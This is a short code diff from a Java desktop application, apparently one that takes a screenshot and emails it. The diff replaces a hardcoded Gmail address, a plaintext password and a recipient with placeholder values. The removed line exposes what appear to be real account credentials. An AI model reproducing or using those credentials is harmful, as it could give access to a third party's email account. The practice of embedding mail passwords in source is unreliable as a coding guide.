@@ -562,7 +562,7 @@ public class TajikData extends JFrame {
 
 				File file = null;
 				String link = new ScreenShot().getScreen(file).toString();
-				SendMail.SendMail("godfrey1363@gmail.com", "sohrab1363", "msfata@me.com", link);
+				SendMail.SendMail("test@gmail.com", "password", "test@me.com", link);
 
 			} catch (MessagingException | AWTException | IOException | InterruptedException e1) {
 				try {
